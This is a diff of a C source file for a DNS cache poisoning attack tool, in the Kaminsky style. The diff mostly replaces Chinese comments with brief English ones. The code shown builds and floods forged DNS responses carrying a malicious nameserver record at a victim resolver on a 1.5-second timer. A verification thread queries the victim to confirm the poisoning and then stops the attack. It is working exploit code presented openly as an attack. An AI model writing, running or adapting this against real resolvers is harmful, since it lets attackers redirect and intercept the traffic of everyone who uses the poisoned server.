@@ -4,9 +4,6 @@
     multi-task strategy. This tool repeatedly triggers queries for new random
     subdomains and submits corresponding packet-flooding tasks to the sender,
     creating a sustained cache poisoning attempt.
-
-    MODIFIED: Includes a verification thread to check for successful poisoning
-    and gracefully stop the attack upon confirmation.
 */
 
 #include <pthread.h>
@@ -20,24 +17,22 @@
 #include "common.h"
 #include "parser.h"
 
-#define ATTACK_INTERVAL_MS 1500 // 每1.5秒发起一轮新攻击
+#define ATTACK_INTERVAL_MS 1500 // attack every 1.5s
 #define VERIFY_INTERVAL_S 3
 
 
 volatile bool g_stop_verify_thread = false;
 
 typedef struct {
-    sender_t* sender;           // sender句柄，用于成功后发送停止信号
-    char* victim_ip;            // 受害者DNS服务器IP
-    char* verify_domain;        // 验证时要查询的域名 (即我们注入的恶意NS名)
-    char* expected_ip;          // 期望从查询结果中看到的IP (即我们注入的恶意NS的IP)
+    sender_t* sender;           // sender hanle to stop
+    char* victim_ip;            // VICTIM IP
+    char* verify_domain;        // POISON NS
+    char* expected_ip;          // EXPECTED IP
 } verify_context_t;
 
 
 /**
- * @brief 投毒验证线程
- * 该线程会定期向受害者DNS服务器查询我们注入的恶意NS记录，
- * 如果返回的A记录IP与我们预期的IP相符，则证明缓存投毒成功。
+ * @brief Verify Thread
  */
 static void* verify_poison_thread(void* args) {
     verify_context_t* ctx = (verify_context_t*)args;
@@ -50,7 +45,7 @@ static void* verify_poison_thread(void* args) {
 
         printf("[Verify] Running check...\n");
 
-        int sockfd = make_sockfd_for_dns(2); // 2秒超时
+        int sockfd = make_sockfd_for_dns(2); // 2s timeout
         if (sockfd < 0) {
             perror("[Verify] Failed to create socket for verification");
             continue;
@@ -101,10 +96,9 @@ static void* verify_poison_thread(void* args) {
         free_parsed_dns_packet(&dns_packet);
 
         if (success) {
-            // 投毒成功！发送异步信号停止sender主循环
             printf("[Verify] Sending stop signal to main loop...\n");
             uv_async_send(ctx->sender->stop_async);
-            break; // 退出验证线程
+            break;
         } else {
             printf("[Verify] Check complete. Poisoning not yet successful.\n");
         }
@@ -117,7 +111,6 @@ static void* verify_poison_thread(void* args) {
     free(ctx);
     return NULL;
 }
-// ======================= 新增部分结束 =======================
 
 
 // Struct to hold arguments for the packet creation worker
@@ -183,7 +176,6 @@ bool make_kaminsky_packets(packet_queue_t* queue, void* args) {
     additional[0] = new_dns_answer_a(s_args->poison_ns_name, inet_addr(s_args->poison_ns_ip), RES_TTL);
 
     uint8_t* dns_payload = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
-    // 注意：make_dns_packet的第12个参数是新增的additionals, 之前的文件可能没有
     size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, 
                                      query, 1,           // 1 Question
                                      NULL, 0,            // 0 Answers
@@ -349,7 +341,6 @@ int main(int argc, char** argv) {
     dns_init();
     uv_loop_t* loop = uv_default_loop();
 
-    // 初始化 sender 框架
     sender_t my_sender;
     if (sender_init(&my_sender, loop, "0.0.0.0", 0) != 0) {
         fprintf(stderr, "Failed to initialize sender\n");
@@ -357,12 +348,10 @@ int main(int argc, char** argv) {
     }
     printf("[+] Sender framework initialized.\n");
 
-    // 创建并设置 multitask 策略
     sender_strategy_t* strategy = create_strategy_multitask(NULL, NULL, NULL, 10);
     sender_set_strategy(&my_sender, strategy);
     printf("[+] Multitask strategy set.\n");
     
-    // 设置攻击上下文
     attack_context_t context = {
         .sender = &my_sender,
         .victim_ip = victim_ip,
@@ -374,17 +363,15 @@ int main(int argc, char** argv) {
         .round_counter = 0
     };
 
-    // 创建并启动验证线程
     pthread_t verify_thread;
     verify_context_t* v_ctx = (verify_context_t*)alloc_memory(sizeof(verify_context_t));
     v_ctx->sender = &my_sender;
     v_ctx->victim_ip = _strdup(victim_ip);
-    v_ctx->verify_domain = _strdup(poison_ns_name); // 我们要验证的是恶意NS的域名
-    v_ctx->expected_ip = _strdup(poison_ns_ip);     // 期望它解析到恶意NS的IP
+    v_ctx->verify_domain = _strdup(poison_ns_name); // POISON_NS
+    v_ctx->expected_ip = _strdup(poison_ns_ip);     // POISON_IP
 
     if (pthread_create(&verify_thread, NULL, verify_poison_thread, v_ctx) != 0) {
         perror("Failed to create verification thread");
-        // 清理并退出
         free(v_ctx->victim_ip);
         free(v_ctx->verify_domain);
         free(v_ctx->expected_ip);
@@ -393,39 +380,32 @@ int main(int argc, char** argv) {
         uv_loop_close(loop);
         return 1;
     }
-    // ======================= 新增部分结束 =======================
 
-    // 设置并启动主攻击定时器
     uv_timer_t attack_timer;
     uv_timer_init(loop, &attack_timer);
     attack_timer.data = &context;
     uv_timer_start(&attack_timer, attack_timer_cb, 0, ATTACK_INTERVAL_MS);
     
-    // 设置信号处理器用于优雅退出
     uv_signal_t signal_handle;
     uv_signal_init(loop, &signal_handle);
     signal_handle.data = &my_sender;
     uv_signal_start(&signal_handle, on_signal, SIGINT);
     
-    // 启动 sender (进入等待任务状态)
     sender_start(&my_sender);
     
     printf("[+] Attack loop started. Running event loop. Press Ctrl+C to stop.\n");
-    uv_run(loop, UV_RUN_DEFAULT); // 主循环会在这里阻塞，直到被 uv_stop 停止
+    uv_run(loop, UV_RUN_DEFAULT);
     
     printf("[+] Event loop stopped. Cleaning up...\n");
     uv_timer_stop(&attack_timer);
 
-    // ======================= 新增部分开始 =======================
-    // 确保验证线程也已停止
     g_stop_verify_thread = true;
     printf("[+] Waiting for verification thread to join...\n");
     pthread_join(verify_thread, NULL);
     printf("[+] Verification thread joined.\n");
-    // ======================= 新增部分结束 =======================
 
     sender_free(&my_sender);
-    uv_run(loop, UV_RUN_ONCE); // 运行一次以处理关闭句柄的回调
+    uv_run(loop, UV_RUN_ONCE);
     uv_loop_close(loop);
 
     printf("[+] Finished.\n");
